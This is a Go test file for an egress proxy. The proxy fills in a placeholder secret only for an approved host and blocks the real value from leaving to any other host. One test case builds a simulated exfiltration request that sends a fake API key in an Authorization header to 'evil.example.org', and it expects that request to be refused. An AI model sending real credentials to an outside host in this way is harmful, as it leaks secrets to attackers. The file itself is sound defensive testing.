package netproxy

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// testRewriter is a minimal SecretRewriter: it materialises a single
// placeholder→value pair only toward an approved host, and flags the
// real value leaving toward any other host as exfiltration.
type testRewriter struct {
	ph, real, host string
}

func (r testRewriter) MaterializeForHost(s, host string) string {
	if host == r.host {
		return strings.ReplaceAll(s, r.ph, r.real)
	}
	return s
}

func (r testRewriter) ExfiltratesTo(s, host string) bool {
	return host != r.host && strings.Contains(s, r.real)
}

// TestInspectSubstitutesAndBlocks drives the full Layer 2 path: a client
// (trusting the ephemeral CA, using the proxy) sends a placeholder to an
// approved host and the real value reaches the upstream; sending the
// real value to an unapproved host is blocked.
func TestInspectSubstitutesAndBlocks(t *testing.T) {
	const realVal = "sk-REAL-abcdef0123456789ABCDEF"
	const ph = "__ITERION_SECRET_tok__"
	const approvedHost = "example.com" // httptest cert covers example.com

	var gotAuth atomic.Value
	gotAuth.Store("")
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth.Store(r.Header.Get("Authorization"))
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()
	upstreamAddr := upstream.Listener.Addr().String()

	upstreamPool := x509.NewCertPool()
	upstreamPool.AddCert(upstream.Certificate())

	ca, err := NewEphemeralCA()
	if err != nil {
		t.Fatalf("NewEphemeralCA: %v", err)
	}

	pol, err := Compile(ModeOpen, nil)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	dial := func(_ context.Context, network, _ string) (net.Conn, error) {
		// Redirect the proxy's upstream connection to the test server.
		return net.Dial(network, upstreamAddr)
	}
	prx, err := New(Options{
		Policy:             pol,
		InspectCA:          ca,
		Rewriter:           testRewriter{ph: ph, real: realVal, host: approvedHost},
		InspectUpstreamTLS: &tls.Config{RootCAs: upstreamPool},
		Dial:               dial,
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if err := prx.Start("127.0.0.1:0"); err != nil {
		t.Fatalf("Start: %v", err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
		defer cancel()
		_ = prx.Shutdown(ctx)
	})

	clientPool := x509.NewCertPool()
	if !clientPool.AppendCertsFromPEM(ca.CertPEM()) {
		t.Fatal("client failed to trust ephemeral CA")
	}
	proxyURL, _ := url.Parse("http://" + prx.Addr().String())
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			Proxy:           http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{RootCAs: clientPool},
		},
	}

	// 1) Approved host: the placeholder is materialised at egress, so the
	//    upstream receives the REAL value.
	req, _ := http.NewRequest("GET", "https://"+approvedHost+"/", nil)
	req.Header.Set("Authorization", "Bearer "+ph)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("approved request: %v", err)
	}
	_ = resp.Body.Close()
	if got := gotAuth.Load().(string); got != "Bearer "+realVal {
		t.Errorf("upstream Authorization = %q, want substituted real value", got)
	}

	// 2) Unapproved host carrying the real value: blocked at egress.
	req2, _ := http.NewRequest("GET", "https://evil.example.org/", nil)
	req2.Header.Set("Authorization", "Bearer "+realVal)
	resp2, err := client.Do(req2)
	if err != nil {
		t.Fatalf("unapproved request transport error: %v", err)
	}
	defer resp2.Body.Close()
	if resp2.StatusCode != http.StatusForbidden {
		t.Errorf("exfiltration to unapproved host not blocked: status %d", resp2.StatusCode)
	}
}
